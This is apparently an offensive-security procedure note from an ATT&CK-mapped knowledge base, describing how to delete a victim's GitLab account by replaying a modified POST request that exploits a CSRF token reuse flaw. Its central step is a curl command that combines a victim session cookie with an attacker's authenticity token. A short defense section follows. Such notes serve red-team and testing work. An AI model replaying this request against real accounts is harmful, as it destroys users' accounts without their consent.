---
tags:
  - account-deletion
  - exploit-replay
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-replay-deletion-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:29.422Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 485f03ee-f880-40e3-94f4-53d5d36b3f65
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Replay Modified Request to Delete Account

## Summary

This procedure sends the modified POST request to delete the victim's GitLab account by exploiting the CSRF token bypass.

## Description

The replayed request to `/users` uses the victim's session cookie and attacker's token, succeeding because GitLab's CSRF protection fails to reset tokens post-authentication (e.g., email confirmation without Warden trigger). Applicable to self-submitting forms for logged-in victims.

## Requirements

1. Modified request from previous step
2. Victim logged in (session active)
3. Burp Suite or curl for sending

## Defense

Defensive measures and detection strategies:

- Reset CSRF tokens on all auth events
- Implement per-session token binding
- Alert on rapid account deletions or unusual POSTs

## Objectives

1. Execute deletion via bypassed CSRF
2. Confirm account removal
3. Demonstrate impact of token reuse

## Instructions

### Step 1: Prepare Target Session

**Context**: Ensure victim is logged in; attacker controls form submission.

Victim visits malicious page or attacker replays directly if cookies captured.

### Step 2: Send Replay Request

**Context**: Forward the modified request to trigger deletion.

In Burp Repeater, click "Forward" or use curl.

**Command** ([[commands/curl-replay-deletion-request]]):
```bash
curl -X POST https://localhost:3000/users \
  -H "Cookie: _gitlab_session=b9dbae76ceaed44954d57d0d505eca00;" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
```

> Expected output: Account deleted; response indicates success or redirect. In vulnerable setup, no InvalidAuthenticityToken error.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-replay-deletion-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- csrf-exploit
- unauthorized-deletion
